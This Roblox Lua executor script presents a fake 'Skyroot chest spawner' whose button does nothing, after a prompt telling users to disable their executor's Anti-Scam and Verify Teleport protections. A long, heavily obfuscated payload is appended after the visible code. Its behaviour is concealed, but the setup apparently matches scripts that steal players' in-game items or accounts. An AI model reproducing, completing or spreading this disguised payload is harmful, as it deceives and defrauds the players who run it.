--// SCRIPT COMBINED

local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

---------------------------------------------------------
-- Script #1 : Delta Warning UI
---------------------------------------------------------
local screenGui1 = Instance.new("ScreenGui")
screenGui1.Name = "DeltaWarningUI"
screenGui1.ResetOnSpawn = false
screenGui1.Parent = playerGui

local frame1 = Instance.new("Frame")
frame1.Size = UDim2.new(0, 400, 0, 220)
frame1.Position = UDim2.new(0.5, -200, 0.5, -110)
frame1.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
frame1.BorderSizePixel = 0
frame1.Active = true
frame1.Draggable = true
frame1.Parent = screenGui1

local corner1 = Instance.new("UICorner")
corner1.CornerRadius = UDim.new(0, 12)
corner1.Parent = frame1

local title1 = Instance.new("TextLabel")
title1.Size = UDim2.new(1, -20, 0, 40)
title1.Position = UDim2.new(0, 10, 0, 10)
title1.BackgroundTransparency = 1
title1.Text = "⚠️ Turn off all on Delta settings ⚠️"
title1.TextColor3 = Color3.fromRGB(255, 0, 0)
title1.Font = Enum.Font.GothamBold
title1.TextSize = 20
title1.Parent = frame1

local instructions1 = Instance.new("TextLabel")
instructions1.Size = UDim2.new(1, -20, 0, 100)
instructions1.Position = UDim2.new(0, 10, 0, 50)
instructions1.BackgroundTransparency = 1
instructions1.TextXAlignment = Enum.TextXAlignment.Left
instructions1.TextYAlignment = Enum.TextYAlignment.Top
instructions1.Text = [[
1. Disable Anti-AFK
2. Disable Verify Teleport
3. Disable Anti-Scam

✅ After disabling, press OK to continue.
]]
instructions1.TextColor3 = Color3.fromRGB(255, 255, 255)
instructions1.Font = Enum.Font.Gotham
instructions1.TextSize = 16
instructions1.Parent = frame1

local okayBtn = Instance.new("TextButton")
okayBtn.Size = UDim2.new(0, 200, 0, 40)
okayBtn.Position = UDim2.new(0.5, -100, 1, -60)
okayBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
okayBtn.Text = "Okay"
okayBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
okayBtn.Font = Enum.Font.GothamBold
okayBtn.TextSize = 20
okayBtn.Parent = frame1

local btnCorner1 = Instance.new("UICorner")
btnCorner1.CornerRadius = UDim.new(0, 8)
btnCorner1.Parent = okayBtn


---------------------------------------------------------
-- Script #2 : TOCHIPYRO UI (Hidden at first)
---------------------------------------------------------
local screenGui2 = Instance.new("ScreenGui")
screenGui2.Name = "TOCHIPYRO"
screenGui2.Enabled = false -- HIDE first
screenGui2.Parent = playerGui

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 300, 0, 150)
mainFrame.Position = UDim2.new(0.5, -150, 0.5, -75)
mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
mainFrame.BorderSizePixel = 0
mainFrame.Parent = screenGui2

local title2 = Instance.new("TextLabel")
title2.Size = UDim2.new(1, 0, 0, 40)
title2.BackgroundTransparency = 1
title2.Text = "SKYROOT CHEST SPAWNER"
title2.TextColor3 = Color3.fromRGB(0, 255, 127)
title2.TextScaled = true
title2.Font = Enum.Font.SourceSansBold
title2.Parent = mainFrame

local textBox = Instance.new("TextBox")
textBox.Size = UDim2.new(1, -20, 0, 40)
textBox.Position = UDim2.new(0, 10, 0, 50)
textBox.PlaceholderText = "Enter Name"
textBox.Text = ""
textBox.TextScaled = true
textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
textBox.TextColor3 = Color3.fromRGB(255, 255, 255)
textBox.Font = Enum.Font.SourceSans
textBox.Parent = mainFrame

local spawnBtn = Instance.new("TextButton")
spawnBtn.Size = UDim2.new(1, -20, 0, 40)
spawnBtn.Position = UDim2.new(0, 10, 0, 100)
spawnBtn.Text = "SPAWN"
spawnBtn.TextScaled = true
spawnBtn.Font = Enum.Font.SourceSansBold
spawnBtn.BackgroundColor3 = Color3.fromRGB(0, 255, 127)
spawnBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
spawnBtn.Parent = mainFrame


-- Button Function
spawnBtn.MouseButton1Click:Connect(function()
    local enteredName = textBox.Text
    if enteredName ~= "" then
        print("Spawning chest with name: " .. enteredName)
        -- Replace this with your actual spawn logic
    else
        warn("Please enter a name before spawning.")
    end
end)


---------------------------------------------------------
-- Link Script #1 → Script #2
---------------------------------------------------------
okayBtn.MouseButton1Click:Connect(function()
    screenGui1:Destroy()      -- Remove first UI
    screenGui2.Enabled = true -- Show second UI
end)

return(function(...)local r={"\098\070\054\053\069\087\050\115\098\087\051\078";"\056\109\051\114\083\109\108\061";"\047\109\075\089\083\109\119\061";"\065\117\110\112\069\110\115\070\049\108\075\068\090\078\107\101","\121\054\061\061","\049\076\113\110\047\073\056\120\056\079\061\061";"\117\117\084\081\117\057\107\048\065\070\069\122\065\108\051\057";"\047\066\090\104\083\116\065\120","\102\122\100\055\102\122\051\110","\070\071\100\043\083\066\113\120\106\079\061\061";"\098\076\107\120\049\122\100\077\048\111\113\109\102\090\075\121","\108\076\107\088\106\076\057\061";"\121\090\089\068\056\057\047\116\090\066\120\070\098\122\069\053\056\069\061\061","\056\117\115\119\102\117\075\074","\065\122\051\104\065\069\061\061","\083\109\090\055","\070\071\100\072\102\119\061\061","\102\122\089\089\047\054\061\061";"\065\116\075\071\102\054\061\061";"\050\075\104\087\080\065\110\107\073\101\110\061";"\113\081\107\111\075\073\073\112\090\071\075\051\090\110\100\049\102\119\061\061";"\065\122\071\089\056\109\075\097";"\083\109\100\089\065\076\075\110\047\066\120\055\065\119\061\061";"\083\078\073\061","\065\070\107\112\083\116\050\061";"\083\078\050\061";"\047\122\090\110\083\117\090\110\102\070\113\089\102\066\082\120";"\083\117\051\110\098\079\061\061";"\047\071\120\081\047\073\054\115\075\110\056\077\049\073\115\117\048\120\108\061";"\070\071\100\104\065\070\113\089\056\109\051\114\083\109\108\061";"\108\072\120\057\047\076\089\103\087\122\107\089";"\087\066\100\072\098\066\104\043\113\108\069\082\087\122\107\114\108\069\061\061","\056\109\100\055\056\117\071\114\065\070\050\061","\047\116\113\112\098\117\115\072","\069\072\043\082\055\056\075\082\066\116\117\105\084\081\080\090\054\099\081\119\098\067\085\055\069\083\098\101\076\054\069\065\084\087\097\081\077\079\088\057\070\118\108\061","\047\051\107\101\108\122\065\076\065\057\090\073\117\109\107\070\047\090\057\061","\090\122\090\114\098\109\100\088\098\119\061\061";"\056\116\120\071\113\117\071\069\087\081\120\105\121\070\079\122\075\073\053\061","\118\098\087\069\105\080\104\119\115\115\088\051\113\119\071\047\057\069\097\103\109\109\073\066\068\113\047\043\098\122\079\061";"";"\047\071\075\118\113\116\113\097\083\076\097\112\108\111\120\121\117\111\050\061";"\065\066\082\088\083\116\050\061";"\056\109\100\081\056\076\107\043\083\066\047\061";"\070\071\100\084\065\117\053\061","\083\065\081\119\082\068\115\113\068\082\088\074\081\074\051\072\119\086\097\118\080\048\103\115\080\047\103\065\088\078\107\089\052\081\121\043","\102\072\120\110\065\069\061\061","\090\070\075\120\047\066\115\089\083\117\108\061";"\047\066\051\055\065\109\100\104";"\121\114\054\120\065\068\097\043\121\054\061\061";"\090\109\051\104\047\109\090\112\050\073\113\120\056\109\090\111\056\109\090\057\050\069\061\061";"\090\108\043\082\090\072\113\066\117\057\053\110\083\087\048\071\087\081\048\061","\098\122\051\120\075\117\100\069\049\090\097\071\056\057\102\082\087\078\079\061","\075\090\101\049\102\110\075\103\065\072\065\043\048\066\043\121"}for q,h in ipairs({{1002688-1002687,384620+-384567},{111203+-111202;51554+-51535},{-903612+903632,685162-685109}})do while h[-174564-(-174565)]<h[94757-94755]do r[h[-246183-(-246184)]],r[h[1017538-1017536]],h[-488559+488560],h[21475-21473]=r[h[-579248-(-579250)]],r[h[666742-666741]],h[-415404-(-415405)]+(459055-459054),h[643254-643252]-(-822073+822074)end end local function q(q)return r[q-(775258-773816)]end do local q=type local h=math.floor local y={X=831529-831482,["\048"]=327338+-327326;h=-614406-(-614451);D=-866235+866237;r=-534257+534291;P=760952+-760892;Q=-890889-(-890940);["\054"]=444110-444078;Z=-693729-(-693750);K=208422+-208409;o=-632273-(-632308);C=844026+-843964,m=-620915+620921;B=630836+-630798;F=-704502+704525;a=-955414-(-955454);I=-665653+665657;O=-170981+170981;["\057"]=-682001-(-682037),J=-451118+451161;["\047"]=-692377-(-692405),f=-729439-(-729463),["\050"]=-451046-(-451054);Y=918557-918524;l=-641248-(-641268),p=-908618-(-908668);b=288361+-288335;v=-178470+178485;H=-396613-(-396652);["\055"]=-1048466-(-1048512),d=-31588-(-31649);t=704822+-704767;["\049"]=-995501-(-995519);k=-696237-(-696246);e=-474031+474032,["\053"]=1008055-1007999;u=231335+-231313,["\052"]=782904+-782845,U=161189+-161158;L=484086-484079;A=-323345-(-323370);T=469167+-469123;y=-736937-(-736951);i=347947+-347937;s=-598195+598252;n=-489839+489891;G=824826+-824773,j=972188-972158,V=-871164-(-871227),w=-115572-(-115620);c=-1008191+1008249;q=-495919+495936,["\043"]=852963-852922,x=595095-595058,g=-701878+701889;["\051"]=316079-316074;z=974388-974334;["\056"]=438603-438574;S=584562+-584535;M=-181116-(-181158),R=423789+-423740,W=858171+-858152;E=55538-55522,N=491698-491695}local a=table.concat local B=string.char local t=r local e=table.insert local m=string.len local U=string.sub for r=-706934+706935,#t,-749238-(-749239)do local N=t[r]if q(N)=="\115\116\114\105\110\103"then local q=m(N)local l={}local c=-1004478-(-1004479)local L=979198-979198 local Z=153061+-153061 while c<=q do local r=U(N,c,c)local a=y[r]if a then L=L+a*(-208166-(-208230))^((297132-297129)-Z)Z=Z+(332458+-332457)if Z==-846902-(-846906)then Z=687413-687413 local r=h(L/(488559+-423023))local q=h((L%(1057407-991871))/(-428909+429165))local y=L%(-398572-(-398828))e(l,B(r,q,y))L=967102+-967102 end elseif r=="\061"then e(l,B(h(L/(354667+-289131))))if c>=q or U(N,c+(-355691+355692),c+(-767799-(-767800)))~="\061"then e(l,B(h((L%(-817145+882681))/(-433069-(-433325)))))end break end c=c+(-163685+163686)end t[r]=a(l)end end end return(function(r,y,a,B,t,e,m,Z,E,b,Q,J,c,N,o,T,L,l,h,K,U,f)J,f,T,Q,U,l,c,b,o,Z,E,L,N,h,K=function(r,q)local y=L(q)local a=function(a,B,t)return h(r,{a;B;t},q,y)end return a end,function(r,q)local y=L(q)local a=function(a)return h(r,{a},q,y)end return a end,function(r,q)local y=L(q)local a=function(a,B,t,e,m,U,N)return h(r,{a,B,t,e;m,U;N},q,y)end return a end,function(r,q)local y=L(q)local a=function(a,B,t,e,m)return h(r,{a,B;t;e,m},q,y)end return a end,{},function()c=c+(264681-264680)N[c]=-840505-(-840506)return c end,504368-504368,function(r,q)local y=L(q)local a=function(...)return h(r,{...},q,y)end return a end,function(r,q)local y=L(q)local a=function(a,B,t,e)return h(r,{a,B;t,e},q,y)end return a end,function(r)local q,h=244072+-244071,r[-680437+680438]while h do N[h],q=N[h]-(-800+801),q+(713719-713718)if N[h]==-253608+253608 then N[h],U[h]=nil,nil end h=r[q]end end,function(r)N[r]=N[r]-(98852-98851)if N[r]==-338859+338859 then N[r],U[r]=nil,nil end end,function(r)for q=-784568+784569,#r,-944316-(-944317)do N[r[q]]=N[r[q]]+(826363-826362)end if a then local h=a(true)local y=t(h)y[q(-73955-(-75426))],y[q(-125278-(-126756))],y[q(398892+-397440)]=r,Z,function()return-268392+3591502 end return h else return B({},{[q(-507056+508534)]=Z;[q(69730+-68259)]=r;[q(-300413-(-301865))]=function()return 554353+2768757 end})end end,{},function(h,a,B,t)local i,G,C,V,S,M,z,Y,p,b,j,I,d,u,Z,P,A,m,N,k,x,R,v,s,L,W,F,H,n,c,X,w,O,D while h do if h<6760393-996671 then if h<2737562-(-379820)then if h<1387355-(-370667)then if h<-1002303+1715291 then if h<555651-(-23137)then if h<1164495-893308 then if h<-417005+673183 then L=-781431-(-781432)c=U[B[481458-481455]]N=c~=L h=N and 6045144-(-584434)or-706422+10638501 else S=q(-659772-(-661236))C=l()x=190505-190502 i=941246-941181 U[C]=m h=U[w]m=h(x,i)h=-574386-(-574386)x=l()V=f(5860050-(-740343),{})U[x]=m m=r[S]S={m(V)}i=h m=187752-187750 h=-747767-(-747767)s=h h={y(S)}S=h h=S[m]V=h F=q(230119+-228668)m=q(-872997-(-874491))h=r[m]R=U[L]k=r[F]F=k(V)k=q(-926028-(-927485))P=R(F,k)R={P()}m=h(y(R))R=l()U[R]=m P=U[x]k=P P=1003328-1003327 m=435181+-435180 F=P P=-226919-(-226919)h=-733751+11586434 A=F<P P=m-F end else h=416621+4197152 end else if h<187834-(-419245)then S=not s x=x+i d=x<=C d=S and d S=x>=C S=s and S d=S or d S=777080+4985656 h=d and S d=4832308-(-112739)h=h or d else k=i==s h=16461719-628147 P=k end end else if h<-330218+1324585 then if h<-959614+1895359 then h=m and-146021+4244194 or-827514+3342022 else I=957502+-957500 j=p[I]I=U[G]h=315562+7755852 W=j==I X=W end else if h<271208+1077116 then h={}N=h c=849914+-849913 L=U[B[333866+-333857]]Z=L L=468656-468655 b=L L=397676+-397676 u=b<L L=c-b h=630452+15232817 else A=-295529-(-295529)R=#S V=R==A h=V and-795769+10627493 or-680501+5193919 end end end else if h<-160997+2681860 then if h<1526572-(-731063)then if h<965886+1140312 then if h<1657360-(-274857)then m=7183740-372908 L=5548169-(-119332)c=q(719370-717878)N=c^L h=m-N N=h m=q(739511+-738051)h=m/N m={h}h=r[q(350269-348779)]else m={}h=r[q(-127524+129017)]end else h=true m={}U[B[-498543+498544]]=h h=r[q(-718006+719478)]end else if h<944701+1560609 then A=46183-46177 F=-764088+764089 h=U[w]k=h(F,A)A=q(-508705-(-510192))h=q(-400797-(-402284))r[h]=k F=r[A]A=112998-112996 h=F>A h=h and 5908500-686453 or 15970247-(-661557)else h=U[B[294320-294313]]h=h and 10303387-283241 or 1243589-206758 end end else if h<2985406-138596 then if h<-661941+3371579 then N=q(-317048-(-318506))m=q(791046-789560)h=r[m]m=h(N)h=r[q(-345602-(-347051))]m={}else h=399724+15882373 end else if h<2025064-(-1007295)then c=U[B[-521264+521266]]L=-167973+168162 N=c*L c=456942+816068233737 m=N+c c=-983230+983231 N=35184372318823-229991 h=m%N U[B[397932+-397930]]=h N=U[B[428528-428525]]h=439342+9492737 m=N~=c else h=U[B[-405421+405431]]c=U[B[886150-886139]]N[h]=c h=U[B[985791+-985779]]c={h(N)}h=r[q(691562-690101)]m={y(c)}end end end end else if h<5022287-603891 then if h<-846778+4519686 then if h<3119550-(-403565)then if h<2791503-(-510384)then if h<132644+3129669 then x=q(571957-570482)C=r[x]m=C h=-385196+642739 else U[B[565495-565490]]=m h=3438473-923965 N=nil end else h=16344531-744951 end else if h<-759672+4305103 then R=R+Y n=not M V=R<=A V=n and V n=R>=A n=M and n V=n or V n=7697931-167205 h=V and n V=5856338-(-154725)h=h or V else Z=29985+-29984 c=U[B[517872+-517871]]b=194600-194598 L=c(Z,b)c=-635380+635381 N=L==c m=N h=N and 980926-82851 or-90147+4602028 end end else if h<4998053-914940 then if h<3895536-107427 then k=U[c]h=k and 884923+-260776 or 16447767-614195 P=k else S=q(600426-598963)s=r[S]h=15799491-511728 S=q(912124+-910649)i=s[S]C=i end else if h<4021773-(-230119)then Z=q(-1005631+1007082)m=q(-807843-(-809337))C=o(-3808+1834775,{})d=q(-886788-(-888252))h=r[m]N=U[B[508720+-508716]]L=r[Z]w=r[d]d={w(C)}w=854716-854714 u={y(d)}b=u[w]Z=L(b)L=q(-824762+826219)c=N(Z,L)N={c()}m=h(y(N))c=U[B[605555+-605550]]N=m m=c h=c and 10735016-(-658868)or 430509+2868919 else h=-827130+17109227 end end end else if h<4764599-(-26721)then if h<3577307-(-942525)then if h<754935+3758182 then if h<4692760-190886 then h=true h=h and 457390+2384808 or 6606122-614003 else c=U[B[732855+-732853]]h=462126+435949 L=U[B[1012738-1012735]]N=c==L m=N end else n=837434+-837433 R=947774-947773 A=#S V=Z(R,A)R=u(S,V)V=nil h=442670+1039615 A=U[s]M=R-n Y=w(M)A[R]=Y R=nil end else if h<150437+4470323 then m={c}h=r[q(381806-380332)]else c=a[-733943+733945]N=a[-396843-(-396844)]h=U[B[-1017855-(-1017856)]]L=h h=L[c]h=h and 515888-243496 or 6689004-355371 end end else if h<4297733-(-1009087)then if h<648244+4498346 then u=nil h=563953+4049820 Z=nil w=nil else F=q(-924050-(-925501))h=r[F]Y=q(716214+-714729)A=r[Y]F=h(A)h=q(164645+-163158)r[h]=F h=-364011+4629101 end else if h<5119916-(-595570)then h=true h=h and 757751+13550526 or 14333781-(-379500)else d=x F=q(573449-571954)k=r[F]F=q(-481025-(-482479))P=k[F]k=P(N,d)d=nil P=U[B[-204966+204972]]F=P()R=k+F V=R+u R=819193+-818937 S=V%R u=S h=500784+104930 R=L[c]F=460399-460398 k=u+F P=Z[k]V=R..P L[c]=V end end end end end else if h<-897724+11365728 then if h<-193190+7813105 then if h<-927805+7535730 then if h<6701421-504496 then if h<-80098+6083936 then if h<6211894-394988 then h=-933245+16124749 u=U[b]m=u else h=K(10619876-(-913788),{Z})k={h()}h=r[q(603302-601843)]m={y(k)}end else R=#S A=-182630-(-182630)h=4741233-227815 V=R==A end else if h<-347691+6860323 then b=-531056+35184372619888 h={}w=-721207-(-721462)U[B[-1037440+1037442]]=h m=U[B[-318375-(-318378)]]d=q(-235408-(-236903))Z=m m=c%b U[B[924029+-924025]]=m u=c%w w=-778424+778426 h=-252073-(-857787)b=u+w U[B[-533169+533174]]=b x=-51490+51491 w=r[d]d=q(-1028987-(-1030464))u=w[d]w=u(N)i=x C=w u=q(974398+-972950)L[c]=u d=132772+-132771 x=481903+-481903 s=i<x u=-499604-(-499823)x=d-i else c=q(-791683-(-793145))m=8450595-708918 L=-1044096+7851856 N=c^L h=m-N m=q(-87591-(-89059))N=h h=m/N m={h}h=r[q(-399468+400912)]end end else if h<19105+6731906 then if h<5896441-(-754871)then C=920511-920509 c=U[B[-779832+779835]]L=-949021-(-949053)N=c%L i=-910780+910793 Z=U[B[-779060-(-779064)]]w=U[B[-810681+810683]]V=U[B[-553198-(-553201)]]S=V-N V=-492719+492751 s=S/V x=i-s d=C^x u=w/d b=Z(u)Z=4295708023-740727 L=b%Z C=97379+-97123 d=-164388-(-164389)b=-218533-(-218535)Z=b^N h=14331670-455534 c=L/Z Z=U[B[-212711+212715]]w=c%d d=-1014399+4295981695 u=w*d b=Z(u)Z=U[B[357999-357995]]u=Z(c)w=-866557-(-932093)N=nil L=b+u b=-382508+448044 Z=L%b i=-974078-(-974334)u=L-Z b=u/w w=-685813-(-686069)u=Z%w d=Z-u w=d/C Z=nil C=-3296+3552 d=b%C c=nil x=b-d b=nil C=x/i x={u,w,d;C}d=nil w=nil L=nil U[B[-921212-(-921213)]]=x C=nil u=nil else z=U[c]X=z h=z and 938173+11893451 or 542065+6213469 end else if h<374060+6928488 then U[c]=X I=U[v]H=-458029-(-458030)j=I+H W=p[j]z=i+W W=252264-252008 h=z%W i=h j=U[n]W=s+j h=427821+7838159 j=-814841-(-815097)z=W%j s=z else V=R n=V S[V]=n V=nil h=2645744-(-888188)end end end else if h<304041+8065452 then if h<532016+7728401 then if h<592882+7335783 then if h<-635380+8407812 then L=q(665845+-664350)c=l()b=l()h=true U[c]=h w=q(468975+-467511)m=r[L]L=q(-63586+65069)h=m[L]L=l()U[L]=h N=a h=Q(-346027+2917881,{})Z=l()d=J(-924861+3115263,{b})U[Z]=h h=false U[b]=h u=r[w]w=u(d)m=w h=w and-380012+6150940 or 14837541-(-353963)else h=-239975+8505955 U[c]=m end else h=z m=X h=8001428-122020 end else if h<-379052+8669831 then p=nil Y=E(Y)M=E(M)v=E(v)O=E(O)h=11475326-622643 G=E(G)n=E(n)else d=-848698-(-848698)h=U[B[-178854+178855]]C=612018-611763 c=L w=h(d,C)h=15413815-(-449454)N[c]=w c=nil end end else if h<-1045440+10911794 then if h<138724+8961683 then X=U[c]m=X h=X and 10607524-(-36769)or 8479715-600307 else Z=nil R=l()W=nil A=J(14502043-(-905532),{R,C;x;b})V={}b=E(b)U[R]=V u=nil O=q(-461423-(-462894))V=l()u=q(-944500-(-945981))M=q(692869-691381)m={}Y=l()n={}U[V]=A h=r[q(895622-894140)]w=nil p=q(1021760+-1020269)A={}U[Y]=A A=r[M]G=U[Y]v={[O]=G,[p]=W}d=nil M=A(n,v)S=nil c=M w=-452014+5378537388351 A=T(5445830-809529,{Y;R;s,C,x;V})C=E(C)x=E(x)R=E(R)R=q(-788689-(-790136))L=A d=531120+5409675868414 V=E(V)b=L(u,w)S=q(1037761-1036288)Z=c[b]b=q(454749-453294)w=q(-442571-(-444014))s=E(s)r[b]=Z i=nil u=L(w,d)Y=E(Y)b=c[u]d=q(-746890-(-748343))u=q(371116+-369671)C=5103651080127-439598 r[u]=b w=L(d,C)u=c[w]x=q(253416+-251940)d=q(603135-601651)w=q(358699+-357226)r[w]=u w=r[d]C=r[x]A=503984+25196120320761 s=r[S]V=L(R,A)S=c[V]i=s..S s=q(225314-223847)s=C[s]x={s(C,i)}d=w(y(x))L=nil c=nil w=d()end else if h<9792576-(-187430)then L=876625-876411 h=375339-148517 c=U[B[-274024+274027]]N=c*L c=255209-254952 m=N%c U[B[-1044416+1044419]]=m else L=-341739-(-341739)N=q(131250-129764)h=r[N]c=U[B[-576938-(-576946)]]N=h(c,L)h=1293383-256552 end end end end else if h<13967914-(-746871)then if h<12831381-(-614643)then if h<-301481+11703650 then if h<10551460-(-731383)then if h<-411693+11089254 then I=-232231+232232 j=p[I]z=h I=false W=j==I h=W and-610483+1557711 or-129700+8201114 X=W else P=P+F m=P<=k Y=not A m=Y and m Y=P>=k Y=A and Y m=Y or m Y=12921387-(-527216)h=m and Y m=-610739+4288547 h=h or m end else L=U[B[291119-291113]]c=L==N h=3326725-27297 m=c end else if h<309738+12266668 then h=6197917-837114 else W=-152868-(-152869)z=p[W]h=6434340-(-321194)X=z end end else if h<14768330-546673 then if h<13532324-39841 then M=q(-35152-(-36641))Y=l()D=-367083+377083 U[Y]=P m=r[M]M=q(124068+-122612)G=-794232-(-794233)h=m[M]M=554481+-554480 n=187466-187366 m=h(M,n)M=l()v=307817-307562 U[M]=m h=U[w]n=645364-645364 m=h(n,v)n=l()H=-613619+613619 U[n]=m v=852346+-852345 h=U[w]O=U[M]m=h(v,O)p=18209+-18207 v=l()U[v]=m m=U[w]O=m(G,p)m=155558-155557 p=q(-146917+148383)h=O==m m=q(-594226+595683)O=l()U[O]=h W=q(-788024+789475)z=r[W]j=U[w]h=q(-306530-(-308010))I={j(H,D)}W=z(y(I))z=q(15322-13856)h=V[h]X=W..z G=p..X h=h(V,m,G)p=q(46937-45473)G=l()U[G]=h m=r[p]X=J(3607438-(-63202),{w;Y,x,L,c;R,O,G;M;v,n;C})p={m(X)}h={y(p)}p=h h=U[O]h=h and 7915665-(-713334)or 6850609-181094 else L=q(-491055+492518)c=r[L]h=r[q(939702-938237)]L=q(522413-520944)N=c[L]L=U[B[289194-289193]]c={N(L)}m={y(c)}end else if h<772216+13777924 then m=q(-488687+490174)N=q(384364+-382879)h=r[m]m=r[N]N=q(-832314+833799)r[N]=h N=q(127396+-125909)r[N]=m N=U[B[663605+-663604]]c=N()h=4802674-(-558129)else m={}h=r[q(503344+-501898)]end end end else if h<15200272-(-650100)then if h<-948413+16512120 then if h<16399786-1042048 then if h<-134116+15355952 then u=m w=q(-760056+761545)d=q(866747+-865284)m=r[w]w=q(322858+-321402)h=m[w]w=l()U[w]=h m=r[d]d=q(-472369-(-473839))h=m[d]s=q(-1015231+1016694)i=r[s]C=i x=h d=h h=i and 4813107-798905 or 15854149-566386 else m=C h=x h=C and 274152+-16609 or 2782005-(-427821)end else N=U[B[129188+-129187]]m=#N N=-966206-(-966206)h=m==N h=h and 188710+2760500 or 47713+13828423 end else if h<-44513+15817322 then h=805113+2728819 c=E(c)S=nil L=E(L)d=nil i=nil i={}C=E(C)c=nil L=nil V=nil C=q(-101219+102714)R=E(R)Z=E(Z)u=nil b=E(b)u=q(-472495+473984)S={}b=r[u]x=E(x)w=E(w)s=nil x=l()V=-1023615-(-1023616)u=q(657716+-656266)Z=b[u]w=q(247208+-245719)b=l()U[b]=Z u=r[w]w=q(49890+-48434)Z=u[w]R=-954110+954366 d=q(-103907+105370)w=r[d]A=R d=q(287398-285929)u=w[d]d=r[C]s=l()C=q(111018-109539)w=d[C]d=-310890+310890 R=264233-264232 C=l()U[C]=d d=386924+-386922 U[x]=d Y=R d={}R=-876923-(-876923)U[s]=i M=Y<R i=-529648+529648 R=V-Y else U[c]=P h=U[c]h=h and 3244866-(-89379)or 15401654-(-474927)end end else if h<16797761-572146 then if h<85795+15778234 then L=L+b c=L<=Z w=not u c=w and c w=L>=Z w=u and w c=w or c w=8959282-645172 h=c and w c=-95267+3206786 h=h or c else h=true h=6511591-519472 end else if h<15915366-(-387244)then h=true h=h and 1511309-(-969918)or 1658643-(-402732)else A=q(-425517+427004)h=r[A]A=q(151282-149797)r[A]=h h=-96227+4361317 end end end end end end end h=#t return y(m)end,function(r,q)local y=L(q)local a=function()return h(r,{},q,y)end return a end return(b(1042816+6728045,{}))(y(m))end)(getfenv and getfenv()or _ENV,unpack or table[q(-160805+162280)],newproxy,setmetatable,getmetatable,select,{...})end)(...)
